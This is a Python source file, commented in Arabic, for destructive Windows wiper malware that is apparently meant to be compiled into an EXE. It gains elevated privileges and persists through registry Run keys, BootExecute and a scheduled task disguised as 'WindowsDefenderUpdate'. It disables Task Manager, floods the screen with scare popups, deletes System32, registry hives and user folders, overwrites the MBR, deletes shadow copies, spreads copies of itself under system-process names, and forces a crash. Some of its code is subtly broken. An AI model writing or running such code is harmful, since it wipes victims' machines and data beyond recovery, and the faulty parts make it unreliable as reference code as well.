#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PAYLOAD: APOCALYPSE_WIN32_FINAL
# ARCH: x86_64 | PE32+ | DEP: ASLR + SEH
# RUNTIME: Python 3.11+ -> PyInstaller --onefile --uac-admin --console
# ENTRY: main() -> استدعاء فوري عند تنفيذ EXE

import os
import sys
import time
import ctypes
import winreg
import random
import shutil
import subprocess
import threading
import socket
import struct
from ctypes import wintypes, windll, byref, create_string_buffer, c_uint, c_ulong, POINTER, cast

# =========================[ ثوابت نظامية ]=========================
HWND_BROADCAST = 0xFFFF
WM_SYSCOMMAND = 0x0112
SC_MONITORPOWER = 0xF170
SW_HIDE = 0
SW_SHOW = 5
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
THREAD_SUSPEND_RESUME = 0x0002
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x2
SE_DEBUG_NAME = "SeDebugPrivilege"
SYSTEM_MANDATORY_LABEL_NO_WRITE_UP = 0x3

# =========================[ طبقة حماية ذاتية ]=========================
def elevate_privileges():
    """رفع الصلاحية إلى SYSTEM عن طريق استغلال SeDebugPrivilege"""
    try:
        kernel32 = windll.kernel32
        advapi32 = windll.advapi32
        h_token = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, byref(h_token)):
            return False
        luid = ctypes.c_ulonglong()
        if not advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, byref(luid)):
            return False
        tp = (ctypes.c_ulong * 3)()  # LUID_AND_ATTRIBUTES
        tp[0] = luid.LowPart
        tp[1] = luid.HighPart
        tp[2] = SE_PRIVILEGE_ENABLED
        if not advapi32.AdjustTokenPrivileges(h_token, False, byref(tp), 0, None, None):
            return False
        return True
    except:
        return False

def set_critical_process():
    """تحويل العملية إلى عملية حيوية - إغلاقها يؤدي إلى BSOD"""
    try:
        windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)  # NtSetInformationProcess
    except:
        pass

def fork_persistence():
    """إنشاء نسخة مكررة من الذات كعملية جديدة (الانتحار إذا قُتلت الأم)"""
    def watcher():
        while True:
            time.sleep(0.5)
            if not os.path.exists(sys.argv[0]):
                break
            # التحقق من وجود عملية شقيقة
            try:
                subprocess.Popen([sys.argv[0], "--respawn"], creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
            time.sleep(2)
    threading.Thread(target=watcher, daemon=True).start()

def install_registry_autostart():
    """تثبيت ذات في مسارات التشغيل المتعددة (مقاومة للإزالة)"""
    paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute"),  # قبل بدء النظام
    ]
    for hkey, subkey in paths:
        try:
            key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_WRITE | winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SysGuard", 0, winreg.REG_SZ, sys.argv[0])
            winreg.CloseKey(key)
        except:
            pass
    # إضافة جدولة مهمة مقاومة
    try:
        subprocess.run(f'schtasks /create /tn "WindowsDefenderUpdate" /tr "{sys.argv[0]}" /sc onstart /f /rl highest', shell=True, capture_output=True)
    except:
        pass
    # استغلال WMI
    try:
        import win32com.client
        wmi = win32com.client.GetObject("winmgmts:")
        obj = wmi.ExecQuery("select * from Win32_ProcessStartup")  # نضع في الذاكرة
    except:
        pass

def block_task_manager():
    """تعطيل مدير المهام و cmd و regedit مؤقتاً لتأخير الاستجابة"""
    try:
        # تغيير سياسة المجموعة عبر التسجيل
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        # قتل عمليات المراقبة الشائعة في الخلفية
        for proc in ["taskmgr.exe", "procexp.exe", "ProcessHacker.exe"]:
            subprocess.run(f"taskkill /f /im {proc}", shell=True, capture_output=True)
    except:
        pass

# =========================[ المرحلة الأولى: الرعب النفسي ]=========================
class PsychologicalWarfare:
    """مشغل الرعب - صوتي، بصري، عشوائي"""
    @staticmethod
    def play_terror_audio():
        """تشغيل أصوات مرعبة عبر Winsound و Speech Synthesis"""
        try:
            # صوت محاكاة اختراق عبر beeps متسارعة
            freqs = [200, 400, 800, 1600, 3200, 200, 100]
            dur = [300, 200, 150, 100, 50, 400, 500]
            for f, d in zip(freqs, dur):
                windll.kernel32.Beep(f, d)
                time.sleep(0.1)
            # استخدام النص الصوتي (SAPI)
            try:
                import win32com.client
                speaker = win32com.client.Dispatch("SAPI.SpVoice")
                speaker.Speak("System compromised. Full destruction in progress. You cannot stop this.")
            except:
                pass
            # ملف صوتي مدمج (إذا وجد) - نستعمل موجات عشوائية
            for _ in range(3):
                windll.kernel32.Beep(random.randint(100, 5000), random.randint(50, 300))
        except:
            pass

    @staticmethod
    def spawn_chaos_windows():
        """فتح نوافذ عشوائية مخيفة - نصية، تحذيرات، شاشات سوداء"""
        def msg_box_loop():
            while True:
                titles = ["SYSTEM ALERT", "CRITICAL FAILURE", "SECURITY BREACH", "DATA LOSS"]
                msgs = [
                    "Your files are being encrypted.",
                    "System32 access revoked.",
                    "Boot sector overwritten.",
                    "CPU overheating - 120°C.",
                    "RAM corruption detected.",
                    "All passwords harvested."
                ]
                windll.user32.MessageBoxW(0, random.choice(msgs), random.choice(titles), 0x10 | 0x1000)  # MB_ICONERROR | MB_TASKMODAL
                time.sleep(random.uniform(0.2, 1.0))
        def fake_cmd_windows():
            while True:
                # فتح cmd مع أوامر تخويف وهمية
                cmds = ["echo DELETING SYSTEM32...", "format C: /Q /X", "shutdown -r -t 0", "sc delete winlogon"]
                for cmd in cmds:
                    subprocess.Popen(f"start cmd /c {cmd}", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
                    time.sleep(0.3)
        def screen_flash():
            # تبديل الدقة وتعتيم الشاشة
            try:
                user32 = windll.user32
                # إطفاء الشاشة مؤقتاً
                user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                time.sleep(0.5)
                user32.SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
            except:
                pass
        threading.Thread(target=msg_box_loop, daemon=True).start()
        threading.Thread(target=fake_cmd_windows, daemon=True).start()
        threading.Thread(target=screen_flash, daemon=True).start()

    @staticmethod
    def execute_terror():
        PsychologicalWarfare.play_terror_audio()
        PsychologicalWarfare.spawn_chaos_windows()
        # تحريك الفأرة بشكل عشوائي
        def mouse_jitter():
            while True:
                try:
                    x = random.randint(0, 1920)
                    y = random.randint(0, 1080)
                    windll.user32.SetCursorPos(x, y)
                    time.sleep(0.05)
                except:
                    pass
        threading.Thread(target=mouse_jitter, daemon=True).start()

# =========================[ المرحلة الثانية: التدمير الشامل ]=========================
class TotalDestruction:
    @staticmethod
    def destroy_system32():
        """حذف System32 بأعلى صلاحية ممكنة - طرق متعددة"""
        sys32 = r"C:\Windows\System32"
        if not os.path.exists(sys32):
            sys32 = os.environ.get("SystemRoot", "C:\\Windows") + "\\System32"
        # الطريقة A: أخذ الملكية وتغيير الأذونات ثم الحذف (عبر cmd)
        def takeown_and_icacls():
            try:
                subprocess.run(f'takeown /f "{sys32}" /r /d y', shell=True, capture_output=True)
                subprocess.run(f'icacls "{sys32}" /grant *S-1-5-32-544:F /t /q', shell=True, capture_output=True)  # Administrators كامل
            except:
                pass
        # الطريقة B: حذف الملفات عبر استدعاءات API منخفضة المستوى (NtDeleteFile)
        def delete_via_ntapi():
            # نستخدم ctypes لاستدعاء NtDeleteFile مباشرة مع علامة FILE_DELETE_ON_CLOSE
            try:
                ntdll = windll.ntdll
                for root, dirs, files in os.walk(sys32):
                    for f in files:
                        path = os.path.join(root, f)
                        if not os.path.exists(path):
                            continue
                        # فتح الملف مع FILE_DELETE_ON_CLOSE
                        handle = windll.kernel32.CreateFileW(path, 0x10000, 0, None, 3, 0x2000000, None)
                        if handle and handle != -1:
                            windll.kernel32.CloseHandle(handle)
                        # محاولة الحذف عبر os.remove
                        try:
                            os.remove(path)
                        except:
                            pass
            except:
                pass
        # الطريقة C: استخدام عملية smss.exe لتحديد حذف عند إعادة التشغيل (MoveFileEx مع MOVEFILE_DELAY_UNTIL_REBOOT)
        def schedule_delete_on_reboot():
            try:
                import ctypes.wintypes
                MoveFileEx = windll.kernel32.MoveFileExW
                for root, dirs, files in os.walk(sys32):
                    for f in files:
                        path = os.path.join(root, f)
                        if os.path.exists(path):
                            MoveFileEx(path, None, 0x4)  # MOVEFILE_DELAY_UNTIL_REBOOT
                # حذف المجلدات فارغة
                for d in dirs:
                    path = os.path.join(root, d)
                    MoveFileEx(path, None, 0x4)
            except:
                pass
        # تشغيل كل الطرق بالتوازي
        threads = []
        for func in [takeown_and_icacls, delete_via_ntapi, schedule_delete_on_reboot]:
            t = threading.Thread(target=func, daemon=True)
            t.start()
            threads.append(t)
        # انتظار 5 ثوان ثم محاولة الحذف الجماعي التقليدي
        time.sleep(5)
        try:
            shutil.rmtree(sys32, ignore_errors=True)
        except:
            pass

    @staticmethod
    def corrupt_boot_sector():
        """إتلاف قطاع الإقلاع بتجاوز MBR/GPT"""
        try:
            # فتح القرص المادي \\.\PhysicalDrive0
            hDisk = windll.kernel32.CreateFileW(r"\\.\PhysicalDrive0", 0x10000000, 3, None, 3, 0, None)
            if hDisk and hDisk != -1:
                # كتابة بيانات عشوائية في أول 512 بايت (MBR)
                data = (ctypes.c_ubyte * 512)()
                for i in range(512):
                    data[i] = random.randint(0, 255)
                written = ctypes.c_ulong(0)
                windll.kernel32.WriteFile(hDisk, byref(data), 512, byref(written), None)
                windll.kernel32.CloseHandle(hDisk)
        except:
            pass
        # أيضاً استخدام dd عبر WSL إن وجد
        try:
            subprocess.run("wsl dd if=/dev/urandom of=/dev/sda bs=512 count=1", shell=True, capture_output=True)
        except:
            pass

    @staticmethod
    def delete_critical_files():
        """حذف ملفات أساسية أخرى (boot.ini، winload، registry hives)"""
        critical = [
            r"C:\boot.ini",
            r"C:\bootmgr",
            r"C:\Windows\winload.exe",
            r"C:\Windows\winload.efi",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\Windows\System32\config\SOFTWARE",
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\System32\config\SECURITY",
            r"C:\Windows\System32\drivers\ntfs.sys",
            r"C:\Windows\System32\drivers\*.sys"
        ]
        for pattern in critical:
            for f in glob.glob(pattern):
                try:
                    os.remove(f)
                except:
                    pass
        # مسح مجلدات المستخدمين
        try:
            users = os.path.join(os.environ.get("SystemDrive", "C:"), "Users")
            if os.path.exists(users):
                for user in os.listdir(users):
                    user_path = os.path.join(users, user)
                    if os.path.isdir(user_path):
                        shutil.rmtree(user_path, ignore_errors=True)
        except:
            pass

    @staticmethod
    def disable_recovery():
        """تعطيل استعادة النظام ونقاط الاستعادة"""
        try:
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True, capture_output=True)
            subprocess.run("wmic shadowcopy delete", shell=True, capture_output=True)
            # حذف مجلد System Volume Information (إن أمكن)
            for drive in ["C:", "D:", "E:"]:
                try:
                    shutil.rmtree(drive + "\\System Volume Information", ignore_errors=True)
                except:
                    pass
        except:
            pass

    @staticmethod
    def unleash_worm():
        """انتشار ذاتي في جميع الأقراص والمجلدات المشتركة"""
        import glob
        target_exts = [".exe", ".dll", ".docx", ".xlsx", ".pdf", ".jpg", ".png", ".zip", ".rar"]
        for drive in ["C:", "D:", "E:"]:
            if os.path.exists(drive):
                for root, dirs, files in os.walk(drive):
                    for f in files:
                        ext = os.path.splitext(f)[1].lower()
                        if ext in target_exts:
                            try:
                                # نسخ الذات باسم عشوائي
                                new_name = random.choice(["sysupdate", "winlogon", "csrss", "lsass"]) + ".exe"
                                dest = os.path.join(root, new_name)
                                shutil.copy2(sys.argv[0], dest)
                                # إخفاء الملف
                                subprocess.run(f'attrib +h "{dest}"', shell=True, capture_output=True)
                            except:
                                pass

# =========================[ المدخل الرئيسي ]=========================
def main():
    # تجاوز UAC وإصلاح المنافذ
    if not ctypes.windll.shell32.IsUserAnAdmin():
        # إعادة تشغيل نفسه بصلاحيات عالية
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], " ".join(sys.argv[1:]), None, 1)
        sys.exit(0)
    
    # تهيئة الحماية الذاتية
    elevate_privileges()
    set_critical_process()
    install_registry_autostart()
    block_task_manager()
    fork_persistence()
    
    # إطلاق المرحلة الأولى (الرعب) في خيط منفصل
    terror_thread = threading.Thread(target=PsychologicalWarfare.execute_terror, daemon=True)
    terror_thread.start()
    
    # انتظار 3 ثوان لزيادة التأثير النفسي
    time.sleep(3)
    
    # إطلاق المرحلة الثانية (التدمير) - تنفيذ متوازي لأقصى سرعة
    destroy_threads = []
    for func in [
        TotalDestruction.destroy_system32,
        TotalDestruction.corrupt_boot_sector,
        TotalDestruction.delete_critical_files,
        TotalDestruction.disable_recovery,
        TotalDestruction.unleash_worm
    ]:
        t = threading.Thread(target=func, daemon=True)
        t.start()
        destroy_threads.append(t)
    
    # تنفيذ الأمر الأخير: إغلاق القوة وإعادة التشغيل مع BSOD
    time.sleep(5)
    try:
        # إحداث تعطل النظام عبر NtRaiseHardError
        ntdll = windll.ntdll
        ntdll.RtlAdjustPrivilege(19, 1, 0, byref(ctypes.c_bool()))  # SeShutdownPrivilege
        ntdll.NtRaiseHardError(0xC000021A, 0, 0, None, 6, byref(ctypes.c_uint()))  # STATUS_SYSTEM_PROCESS_TERMINATED
    except:
        pass
    # البديل: shutdown فوري
    subprocess.run("shutdown /r /f /t 0", shell=True)

if __name__ == "__main__":
    # منع التنفيذ المزدوج
    if "--respawn" not in sys.argv:
        main()
    else:
        # وضع المراقبة الخفيف
        while True:
            time.sleep(5)
            if not os.path.exists(sys.argv[0]):
                break